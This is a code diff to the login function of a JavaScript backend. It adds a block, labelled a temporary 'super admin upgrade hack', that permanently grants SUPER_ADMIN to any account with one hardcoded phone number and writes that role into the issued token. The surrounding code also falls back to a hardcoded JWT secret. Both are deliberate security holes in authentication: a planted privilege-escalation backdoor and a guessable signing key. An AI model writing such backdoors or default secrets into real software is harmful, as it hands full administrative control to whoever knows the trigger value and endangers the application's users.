@@ -82,6 +82,12 @@ export const login = async (req, res) => {
         const isMatch = await bcrypt.compare(password, user.password);
         if (!isMatch) return res.status(401).json({ message: "INVALID AUTH" });
 
+        // 🚀 TEMPORARY SUPER ADMIN UPGRADE HACK (ADDED HERE)
+        if (user.phone === "01711111111") {
+            user.role = "SUPER_ADMIN";
+            await user.save();
+        }
+
         const token = jwt.sign(
             { id: user._id, role: user.role },
             process.env.JWT_SECRET || 'TRVNX_SECRET',
